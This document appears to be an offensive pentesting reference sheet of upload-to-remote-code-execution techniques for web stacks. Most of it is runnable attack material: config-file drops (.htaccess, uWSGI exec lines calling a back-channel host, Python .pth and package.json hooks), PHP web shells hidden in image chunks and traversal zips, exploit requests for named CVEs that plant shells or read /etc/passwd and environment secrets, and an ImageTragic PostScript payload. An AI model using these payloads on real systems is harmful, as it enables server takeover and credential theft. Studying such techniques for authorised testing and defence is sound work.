# Stack-specific upload-to-RCE recipes — Open WHEN: a file lands in the web root or reaches a named server/processor and you need the matching config-drop, named-CVE chain, or archive/parser technique

Owner body already names the `.htaccess`/`.user.ini`/`web.config`
concept, the ImageTragic MVG seed, Ghostscript `%pipe%`, ExifTool
CVE-2021-22204, Zip Slip/symlink/zip-bomb, and CVE-2024-29510 /
-53677 / -57169 / -48514. Everything below is the concrete, runnable
layer: exact config-file bodies, image-format-survival chunks, dated
file-write→RCE CVE chains, and archive/parser-confusion PoCs.

## Config-file drops with concrete bodies

Apache `.htaccess` — map an arbitrary ext to the PHP handler, then
upload any file ending `.rce`:
```
AddType application/x-httpd-php .rce
```

uWSGI `.ini` (parsed on restart/crash/autoreload; the `@(exec://)`
scheme runs commands — the payload can also live inside an image/PDF
since parsing is lax):
```ini
[uwsgi]
body  = @(exec://whoami)
extra = @(exec://curl http://back-channel-host/)
test  = @(http://back-channel-host/)
```

Python `.pth` dropped into `site-packages`/`dist-packages` runs its
line at every interpreter startup (find dirs via `python3 -m site`):
```
import os; os.system("id")
```

Dependency-manager configs — overwrite then trigger an install/run:
```jsonc
// package.json
"scripts": { "prepare": "/bin/touch /tmp/pwned.txt" }
// composer.json
"scripts": { "pre-command-run": ["/bin/touch /tmp/pwned.txt"] }
```

Jetty: upload an `*.xml` or `*.war` into `$JETTY_BASE/webapps/` — both
are auto-deployed/processed → RCE.

## Image-format chunks that survive PHP-GD compression/resize

When the server re-encodes uploads (`imagecopyresized`,
`imagecopyresampled`, `thumbnailImage`), a tail-appended shell is lost;
embed it in a chunk that survives:
```
PNG IDAT chunk  -> survives imagecopyresized / imagecopyresampled
PNG PLTE chunk  -> survives palette-based resize
PNG tEXt chunk  -> survives thumbnailImage
```
Generators: synacktiv `astrolock` (`gen_idat_png.php`,
`gen_plte_png.php`, `gen_tEXt_png.php`); call the planted shell via an
LFI: `curl 'http://t/inc.php?0=system' --data "1='id'"`.

## ImageMagick / FFmpeg arbitrary file-read (distinct from the MVG RCE seed)

ImageMagick **CVE-2022-44268** — file-read via a crafted PNG `profile`;
the converted output embeds the target file's bytes:
```bash
pngcrush -text a "profile" "/etc/passwd" exploit.png
# server runs: convert exploit.png out.png
identify -verbose out.png            # read the hex back
python3 -c 'print(bytes.fromhex("HEX").decode())'
```

FFmpeg HLS-in-AVI **arbitrary file-read** — a malicious HLS playlist
hidden in an AVI's GAB2 stream makes `ffmpeg -i in.avi out.mp4` splice
a server file into the output video:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST
```
Build with `gen_xbin_avi.py file:///etc/passwd read.avi`, upload, play.

## Archive (zip) extract-to-RCE and parser-confusion

Symlink-in-zip — read files outside the extract dir on access:
```bash
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt    # tar -cvf test.tar symindex.txt
```

Traversal-entry zip (writes a shell into the web root on extract) —
either `evilarc` or a hand-built Python archive:
```python
import zipfile
z = zipfile.ZipFile('poc.zip','w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/shell.php',
           '<?php echo system($_REQUEST["cmd"]); ?>')
z.close()
```
```bash
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
File-spraying variant (hex-edit `xxA`→`../` in entry names after
zipping a directory of N copies) sprays the shell across many depths.

**ZIP NUL-byte smuggling** (PHP ZipArchive vs. extractor disagree):
ZipArchive truncates the entry name at the first `0x00` (sees
`shell.php\x00.pdf` as `.pdf`), but extraction writes the full name →
`shell.php` on disk:
```bash
cp embedded.pdf shell.php..pdf && zip null.zip shell.php..pdf
# hex-edit BOTH local header + central directory: the '.' after
# ".php" -> 0x00, yielding shell.php\x00.pdf
php -r '$z=new ZipArchive;$z->open("null.zip");echo $z->getNameIndex(0);'
```

**Stacked/concatenated ZIPs** — `cat benign.zip evil.zip > combo.zip`;
validators that parse the first EOCD see only `benign.zip` while an
extractor honouring the last EOCD pulls `shell.php` out of `evil.zip`.

## Dated arbitrary-file-write → RCE CVE chains

**CVE-2023-45878 — Gibbon LMS <= 25.0.01**, unauth file write to web
root via `rubrics_visualise_saveAjax.php` (`img`=`mime;name,base64`,
`path`=dest, `gibbonPersonID`=any):
```bash
curl http://t/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
 -d 'img=image/png;f,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=&path=shell.php&gibbonPersonID=0000000001'
curl 'http://t/Gibbon-LMS/shell.php?cmd=id'
```

**CVE-2024-21546 — UniSharp Laravel-Filemanager < 2.9.1**, trailing-dot
strip: valid PNG magic + `filename="shell.php."` persists as
`shell.php` under `/storage/files/` → `GET /storage/files/shell.php?cmd=id`.

**Tomcat gzip + path-traversal write** — body is a gzipped JSP, a path
param carries the traversal:
```http
POST /fileupload?token=..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Content-Type: application/octet-stream
Content-Encoding: gzip

<gzip-bytes-of-jsp>      ->  GET /jsp/shell.jsp?cmd=id
```

**Axis2 SOAP `uploadFile` traversal** (default creds `admin` /
`trubiquity`) — `jobDirectory` not canonicalized, drops a JSP into
Tomcat webapps; `dataHandler` is base64. Pair with full-read SSRF if
the binding is localhost-only.

**n8n Content-Type confusion → arbitrary file read (CVE-2026-21858)** —
handler trusts parsed `files` without enforcing multipart; send JSON
with `filepath` pointing anywhere, the upload echoes that file back:
```http
POST /form/vulnerable-form HTTP/1.1
Content-Type: application/json

{"files":{"document":{"filepath":"/proc/self/environ","mimetype":"image/png","originalFilename":"x.png"}}}
```
Chain: `/proc/self/environ` -> `$HOME/.n8n/config` (keys) ->
`$HOME/.n8n/database.sqlite`.

## ImageTragic alternate PS variant (CVE-2016-3714, upload with image ext)

```
%!PS
userdict /setpagedevice undef
save  legal  { null restore } stopped { pop } if
{ legal } stopped { pop } if  restore
mark /OutputFile (%pipe%id) currentdevice putdeviceprops
```
Triggered when the backend runs `convert shellexec.jpeg out.gif`.
